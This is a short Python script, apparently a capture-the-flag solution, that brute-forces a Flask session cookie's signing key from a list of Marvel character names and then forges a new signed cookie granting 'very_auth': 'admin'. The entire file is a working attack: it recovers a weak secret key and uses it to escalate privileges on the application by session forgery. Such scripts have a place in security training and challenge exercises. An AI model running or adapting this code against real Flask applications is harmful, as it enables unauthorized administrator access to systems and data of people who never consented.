import flask
import hashlib

from sys import argv
from flask.json.tag import TaggedJSONSerializer
from itsdangerous import URLSafeTimedSerializer, TimestampSigner, BadSignature

cookie = argv[1]

cookie_names = ["captain america", "iron man", "hulk", "black widow", "iron man", "hawkeye", "star lord", "groot", "black panther", "spider man", "drax", "ant man", "thanos", "dr strange", "gamora", "loki", "nick fury", "agent hill", "pepper potts", "jarvis", "falcon", "ultron", "thor", "rocket", "war machine", "vision", "scarlet witch"]

real_secret = ''

for secret in cookie_names:
    try:
        serializer = URLSafeTimedSerializer(
            secret_key=secret,  
            salt='cookie-session',
            serializer=TaggedJSONSerializer(),
            signer=TimestampSigner,
            signer_kwargs={'key_derivation' : 'hmac',
                'digest_method' : hashlib.sha1
        }).loads(cookie)
    except BadSignature:
        continue

    print(f'Secret key: {secret}')
    real_secret = secret

session = {'very_auth' : 'admin'}

print(URLSafeTimedSerializer(
    secret_key=real_secret,
    salt='cookie-session',
    serializer=TaggedJSONSerializer(),
    signer=TimestampSigner,
    signer_kwargs={
        'key_derivation' : 'hmac',
        'digest_method' : hashlib.sha1
    }
).dumps(session))
